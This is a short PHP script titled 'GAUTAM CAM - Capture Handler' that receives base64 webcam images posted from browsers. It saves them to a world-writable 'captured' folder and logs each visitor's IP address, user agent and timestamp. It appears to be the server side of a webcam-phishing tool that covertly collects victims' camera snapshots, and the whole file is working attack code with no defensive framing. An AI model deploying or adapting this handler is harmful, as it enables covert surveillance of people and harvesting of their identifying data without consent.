<?php
// GAUTAM CAM - Capture Handler
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');

// Get image data
$image_data = $_POST['image'] ?? '';

if (empty($image_data)) {
    die('No image data received');
}

// Remove data:image/png;base64, prefix
$image_data = str_replace('data:image/png;base64,', '', $image_data);
$image_data = str_replace(' ', '+', $image_data);
$image_binary = base64_decode($image_data);

// Create images folder
if (!file_exists('captured')) {
    mkdir('captured', 0777, true);
}

// Save image
$filename = 'captured/cam_' . date('Ymd_His') . '.png';
file_put_contents($filename, $image_binary);

// Log entry
$log_file = 'camera.log';
$entry = "========================================\n";
$entry .= "📅 Date: $date\n";
$entry .= "🌐 IP: $ip\n";
$entry .= "📁 Image: $filename\n";
$entry .= "🖥️ User Agent: $user_agent\n";
$entry .= "========================================\n\n";
file_put_contents($log_file, $entry, FILE_APPEND);

echo "✅ Image saved: $filename";
?>
